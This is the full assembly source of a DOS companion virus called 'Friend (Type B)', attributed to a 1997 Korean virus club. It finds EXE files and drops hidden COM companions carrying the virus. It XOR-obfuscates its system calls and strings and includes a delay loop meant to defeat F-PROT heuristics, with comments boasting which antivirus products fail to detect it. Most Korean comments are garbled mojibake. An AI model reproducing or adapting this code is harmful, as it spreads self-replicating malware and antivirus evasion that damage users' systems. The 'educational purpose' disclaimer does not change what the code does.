;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;                                             \          \     \   \
;     Friend (Type B)                         \           \   \    \   98/03
;                      by Osiris / CVC        \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #01
;
; Virus Name : Friend (Type B)
; AV Name    : Frien
; Author     : Osiris of CVC
; Origin     : Corea
; Date       : 1997/09/05
;
; Type : Non memory resident Companion
;
; !****************************************************************************!
; *                                                                            *
; * ‰w‰¡ !                                                                     *
; *    ·¡ˆõ·e ¤a·¡œá¯a ­¡¯a Å¡—a·¡”a. Ša·B¸â·¥ ¡¢¸â·a¡ e ¬a¶w–A´á´¡Ðe”a.      *
; *    ¹A¸b¸a“e ·¡ ­¡¯aÅ¡—a¡ ´¡‹¡–A“e ´á˜áÐe ¢…¹AµA ”Ð¬á•¡ À‚·±·i »¡»¡ ´g   *
; *    “e”a. ¥eÑw Ðaˆáa ¯©Ð—Ða»¡  aœa !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify & execute it !                                        *
; *                                                                            *
; !****************************************************************************!
;
; §¡¬wº Companion ¤a·¡œá¯a·¡”a.
; CVL #03 µA¬á ‰·ˆ–E ¤á¸å·e –¤å¼ ¤á¸å·¡”a.
;
; Ñe¸ —¡BÉ¡Ÿ¡µA¬á 1 ˆ· EXE Ìa·©·i Àx´a •··© Ìa·©¡w COM Ìa·©·i ¬—¬÷Ð–…”a.
;
; Ã¡ža“e ¬—¬÷–E COM Ìa·© e ¬b¹AÐa¡e –E”a.
;
; * Friend (Type A) : ÂAÁ¡ ¤á¸å
; ! Friend (Type B) : Anti-herustic ‹¡¤ó ¬a¶w
;
;
; AV ÉA¯aËa : 1998 ‘e 1¶© Ñe¸ DSAV,F-PROT,TBAV µA¬á »¥”e–A»¡ ´g“e”a.
; Heuristic Test : AVP µA¬á »¥”e–A¡a F-PROT µA¬á ˆeÑ¢ »¥”e–E”a.
;                  DrWeb µA¬á »¥”e–E”a.
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL  TINY
            .CODE

 PARASIZE   EQU  (End_Memory-Friend+0Fh) SHR 4 + 13h

            org   100h

 Friend:
            call  Anti_Herustic             ; F-prot · »¥”e·i ¤wÐÐe”a.
            jmp   Virus_Start               ; ¤a·¡œá¯a ¯¡¸b

 Msg        db    0Dh,0Ah
            db    '[Friend] Type B. 1997/09'
            db    '(c) Copyleft Osiris of CVC (Corean Virus Club),Corea$'

 Ext        db    'C' XOR 12h, 'O' XOR 12h, 'M' XOR 12h ; ´qÑ¡ÑÁ –A´á ·¶”a.
            db    '*' XOR 12h, '.' XOR 12h, 'E' XOR 12h
            db    'X' XOR 12h, 'E' XOR 12h,  00 XOR 12h

 Virus_Start:
            mov   si, offset Ext            ; ´qÑ¡ÑÁ–E ÑÂ¸w¸a ¥¢¬a
            mov   di, offset Ext_COM        ; ¥¢¬a –I ‰µ
            mov   cx, 0009                  ; ‹©·¡
 CopyExt:
            lodsb
            xor   al,12h                    ; ¥¢¬a –A¡e¬á ´qÑ¡ÑÁ–E ¶w·i Î…”a.
            stosb
            loop  CopyExt

            mov   ah, (2fh xor 12h)         ; DTA ŠÐa‹¡
            call  call_Int21
            push  es                        ; DTA ˆt ¸á¸w
            push  bx

            mov   ah, (1ah xor 12h)         ; ¬¡¶… DTA ¬é¸÷
            mov   dx, offset NewDTA
            call  call_Int21

            mov   ah,(4Eh xor 12h)          ; EXE Ìa·© Àx‹¡
            mov   cx,00100011B              ; ·ª‹¡¸å¶w/®‘‹±Ìa·©
            mov   dx, offset Mask_EXE       ;
 Find_repeat:
            call  call_Int21                ;
            jc    Execute_EXE               ; ˆqµq ¯¡Ç© Ìa·©·¡ ´ô·a¡e EXE ¯©Ð—

 Infect_EXE:
            mov   si, offset NewDTA + 1Eh   ; SI = Ìa·© ·¡Ÿq
            call  ChgExt                    ; EXE -> COM, COM -> EXE

            mov   ax, (4300h xor 1234h)     ; ˆqµq µa¦ ÑÂ·¥
            mov   dx, offset NewDTA + 1Eh   ; -> COM Ìa·©·¡ ¹¥¸ Ða“eˆa ?
            call  call_Int21                ; ­¢¬÷·i Àx·i ® ·¶”a¡e ˆqµq–A´á ·¶
            jc    Drop_COM                  ; ”a.

            mov   ah, (4Fh xor 12h)         ; ”a·q Ìa·© Àx‹¡
            jmp   Find_repeat

 Drop_COM:
            mov   ah, (3ch xor 12h)         ; COM Ìa·© ¬—¬÷
            mov   cx, 00000011B             ; ·ª‹¡ e / ®‘‹±
            mov   dx, offset NewDTA + 1Eh   ;
            call  call_Int21

            xchg  ax,bx                     ; Ð…—i ´è‹¡

            mov   ah, (40h xor 12h)         ; ¤a·¡œá¯a ³a‹¡
            mov   cx, offset End_virus - 100h ; ¤a·¡œá¯a ‹©·¡
            mov   dx, 100h                  ; ¤áÌá
            call  call_Int21

            mov   ah, (3eh xor 12h)         ; Ìa·© ”h‹¡
            call  call_Int21

 Execute_EXE:
            pop   dx                        ; ¶¥œ DTA ¥¢Š
            pop   ds
            mov   ah,1ah
            int   21h

            mov   sp, offset End_Memory     ; ¯aÈ‚ ¹¡¸÷

            mov   ah,4ah                    ; ¡A¡¡Ÿ¡ ¹¡¸÷
            mov   bx, PARASIZE
            int   21h

            call  Set_env                   ; ¶¥œ EXE Ìa·© ¯©Ð—·i ¶áÐe ÑÅ‰w
                                            ; µwµb ¬é¸÷

            mov   si, offset Filename
            call  ChgExt                    ; ÑÂ¸w¸a ¥e‰w

            mov   ax, 4b00h                 ; ¶¥œ EXE Ìa·© ¯©Ð—
            mov   bx, offset Env_Block
            mov   dx, offset Filename
            int   21h

            mov   ah, 4dh                   ; Ÿ¡Èåˆt ´è‹¡
            int   21h
 Stop_virus:
            mov   ax, 4c00h                 ; ¤a·¡œá¯a {‹¡
            int   21h

;******************************************************************************
; ÑÂ¸w¸a ¤aŽ‹¡ (EXE -> COM, COM -> EXE)
; ·³b SI = ¤aŽ‰¡¸a Ða“e ÑÂ¸w¸a
;******************************************************************************

 ChgExt     proc  near                      ; ÑÂ¸w¸a ¤aŽ‹¡

 Loop_Eof:
            lodsb
            or    al,al
            jnz   Loop_Eof

            mov   di,si
            sub   di,4                      ; DI = ÑÂ¸w¸a ¶áÃ¡
            mov   si, offset Ext_COM        ; SI = COM

            cmp   byte ptr [di],'E'         ; EXE Ìa·© ·¥ˆa ?
            jz    mov_ext
            add   si,0005                   ; SI = EXE
 mov_ext:
            mov   cx,0003
            repz  movsb                     ; ÑÂ¸w¸aˆa COM ·¡¡e EXE ¡
                                            ; EXE ·¡¡e COM ·a¡ ¤aŽ…”a.
            ret
 ChgExt     Endp


;******************************************************************************
; ÑÅµwµwµbµA¬á ¸¯©Ð—µA Ï©¶aÐe ¸÷¥¡ ´è‹¡
;******************************************************************************
 Set_Env    proc  near

            mov   PSP1,es
            mov   PSP2,es
            mov   PSP3,es

 Search_RD:                                 ; ”a¯¡ ¯©Ð—Ða‹¡ ¶áÐ¬á Ï©¶aÐe ˆt—i·i ´i´a…”a.
            xor   si,si
            mov   ds,ds:[002Ch]             ; ¯©Ð—¯¡Ç¥ Ìa·©· ·¡Ÿq·i ´i´a…”a.

 Search_RD_LOOP:
            cmp   word ptr DS:[SI],0000     ; Ìa·©·¡Ÿq¸åµA“e 0000·¡”a.
            jz    Get_FileName              ; PSP:[002Ch] --> ­A‹a åËa
            inc   si
            jmp   Search_RD_LOOP

 Get_FileName:
            add   si,0004
            mov   dx,si                     ; Ñe¸ ¯©Ð—–A“e Ìa·©·¡Ÿq

            mov   di, offset Filename
            mov   cx,0080
            repz  movsb

            push  cs                        ;
            pop   ds
            RET

 Set_env    endp

;******************************************************************************
;           F-PROT · ·¥‰·»¡“w ˆñ¬aŸi ¢bÑÁ ¯¡Ç¥”a.
;******************************************************************************
 Anti_Herustic    Proc
                                            ; F-prot µA‰A ·¡ Ïa¡‹aœ‘·e žÏaŸi
            mov   si,9452                   ; •¡“eˆõ Àáœñ ­¢µa¬á ”a·q·a¡ ¹A´á
 AH_Loop:                                   ; Š¥·¡ ñ´á ˆa»¡ ´g‰A Ð¬á »¥”e·i
            nop                             ; ¤wÐÐe”a.
            nop                             ;
            dec   si
            cld                             ;
            jnz   AH_Loop                   ;
            ret


 Anti_Herustic    Endp

;
; ·¥ÈáœóËa 21h Ñ¡Â‰
;

 Call_Int21       proc

            xor   ax,1234h                  ;
            int   21h
            ret

 Call_Int21       endp

;
; ¸¯©Ð—·i ¶áÐe §iœâ
;

 ENV_BLOCK  dw    ?                         ; ¸¯©Ð—¶w §iœâ
            dw    80h                       ;
 PSP1       dw    ?
            dw    5ch                       ;
 PSP2       dw    ?
            dw    6ch                       ;
 PSP3       dw    ?

 End_Virus:

 Ext_COM    db    3 dup (0)                 ; ÑÂ¸w¸a COM
 Mask_EXE   db    5 dup (0)                 ; *.EXE ¸á¸w

 Filename   db    85  dup (0)               ; Ìa·© ·¡Ÿq
 NewDTA     db    50  dup (0)               ; DTA
            db    100 dup (0)               ; ¯aÈ‚

 End_Memory:

            END   Friend

